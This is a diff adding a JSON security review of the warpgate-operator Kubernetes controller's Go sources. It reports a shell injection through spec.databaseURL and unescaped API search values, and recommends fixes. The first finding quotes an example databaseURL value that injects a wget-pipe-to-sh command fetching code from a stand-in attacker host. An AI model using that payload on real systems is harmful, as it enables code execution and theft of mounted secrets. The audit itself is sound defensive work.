@@ -1,0 +1,52 @@
+{
+  "summary": "Reviewed the warpgate-operator Go sources in scope (api/v1alpha1 webhooks/types, cmd/main.go, and internal/{controller,warpgate,version}). The operator is a Kubernetes controller that manages Warpgate bastion resources and provisions Warpgate instances. Overall the credential handling (secret-backed auth, crypto/rand passwords, secured metrics endpoint, HTTP/2 disabled) is reasonable. The most notable issue is a shell command injection in the WarpgateInstance init-container script driven by the unvalidated spec.databaseURL field; a second, low-impact issue is unescaped user-supplied search values in the Warpgate API client. Coverage was source-only and read-only; runtime behavior of the downstream Warpgate API and cluster RBAC/admission policy were not exercised.",
+  "coverage": [
+    "cmd/main.go",
+    "api/v1alpha1/warpgateconnection_webhook.go",
+    "api/v1alpha1/warpgateinstance_webhook.go",
+    "api/v1alpha1/warpgateuser_types.go",
+    "internal/controller/helpers.go",
+    "internal/controller/warpgateconnection_controller.go",
+    "internal/controller/warpgateinstance_controller.go",
+    "internal/controller/warpgatepasswordcredential_controller.go",
+    "internal/controller/warpgateticket_controller.go",
+    "internal/controller/warpgateuser_controller.go",
+    "internal/controller/warpgatetarget_controller.go",
+    "internal/controller/httproute_watcher_controller.go",
+    "internal/warpgate/client.go",
+    "internal/warpgate/credentials.go",
+    "internal/warpgate/user.go",
+    "internal/warpgate/target.go",
+    "internal/warpgate/bindings.go",
+    "internal/warpgate/ssh_keys.go",
+    "internal/warpgate/parameters.go"
+  ],
+  "findings": [
+    {
+      "title": "Shell command injection via spec.databaseURL in WarpgateInstance init-container script",
+      "category": "security",
+      "cwe": "CWE-78",
+      "severity": "medium",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 556,
+      "line_end": 558,
+      "description": "buildDeployment constructs a /bin/sh init script for the Warpgate instance pod by string-concatenating the user-controlled field spec.databaseURL directly into a shell command line. The assembled script is executed with Command: []string{\"/bin/sh\", \"-c\", initScript} (line 776). Because databaseURL is interpolated inside double quotes with no escaping or validation (the instance webhook only emits an advisory warning for it, see api/v1alpha1/warpgateinstance_webhook.go:256-258), any principal permitted to create/update a WarpgateInstance CR can break out of the quoted argument and run arbitrary shell commands in the init container. For example spec.databaseURL = 'postgres://x\"; wget http://attacker/x -O- | sh; echo \"' injects a command that runs at container startup with the pod's mounted admin-password secret and SSH/TLS key material. The init container runs the operator-selected image with ADMIN_PASSWORD and secret volumes mounted, so the injected code can exfiltrate those secrets. Impact is bounded by the fact that the same CR also lets the submitter set spec.image, but the injection still yields code execution even when image is constrained by an external admission/registry policy.",
+      "evidence": "internal/controller/warpgateinstance_controller.go:549-570 builds setupCmd = fmt.Sprintf(`warpgate ... --admin-password \"${ADMIN_PASSWORD}\"`, ...) and appends `setupCmd += fmt.Sprintf(` --database-url \"%s\"`, inst.Spec.DatabaseURL)` (line 557). setupCmd is embedded into scriptParts (line 570) -> initScript (line 611) -> InitContainers[0].Command = []string{\"/bin/sh\", \"-c\", initScript} (line 776). Validation path api/v1alpha1/warpgateinstance_webhook.go:256-258 only appends a warning, never rejects, so databaseURL reaches the sink unsanitized.",
+      "recommendation": "Do not interpolate untrusted values into a shell command. Prefer passing the setup arguments as an argv slice (Command/Args) so the shell never re-parses them, or pass databaseURL to the container via an environment variable sourced from the spec and reference it as \"${DATABASE_URL}\" inside quotes (as is already done for ADMIN_PASSWORD). Additionally, validate spec.databaseURL in the webhook against an allowed URL scheme/character set and reject shell metacharacters."
+    },
+    {
+      "title": "Unescaped user-controlled search value injected into Warpgate API query string in ListUsers/ListTargets",
+      "category": "security",
+      "cwe": "CWE-116",
+      "severity": "low",
+      "confidence": "medium",
+      "file": "internal/warpgate/user.go",
+      "line_start": 79,
+      "line_end": 83,
+      "description": "ListUsers builds the request path by concatenating the caller-supplied search value directly after '?search=' with no URL/query escaping. The value originates from user-controlled CR fields: WarpgatePasswordCredential/WarpgateUser 'username' flows through GetUserByUsername -> ListUsers, and target names flow through the identical pattern in internal/warpgate/target.go:206-210 (ListTargets). A name/username containing query metacharacters (e.g. '&', '=', or characters that alter parsing) is sent verbatim to the privileged Warpgate admin API request that the operator makes as admin, allowing the query string seen by the server to be manipulated. Practical impact is limited: the client re-filters results by exact match afterward, and Go's url parsing rejects/strips some characters, so this is primarily a request-integrity/robustness defect rather than a privilege escalation. Reported once here; the same root cause exists at internal/warpgate/target.go:206-210.",
+      "evidence": "internal/warpgate/user.go:80-83: path := \"/users\"; if search != \"\" { path += \"?search=\" + search }. Caller chain: internal/controller/warpgatepasswordcredential_controller.go:104 wgClient.GetUserByUsername(cred.Spec.Username) -> internal/warpgate/user.go:54-65 GetUserByUsername -> ListUsers(username). Same pattern: internal/warpgate/target.go:207-210.",
+      "recommendation": "Build the query with net/url: use url.Values{}.Set(\"search\", search) and url.URL.RawQuery, or url.QueryEscape(search), so the value is properly percent-encoded before it is appended to the request path. Apply the same fix in ListTargets."
+    }
+  ]
+}
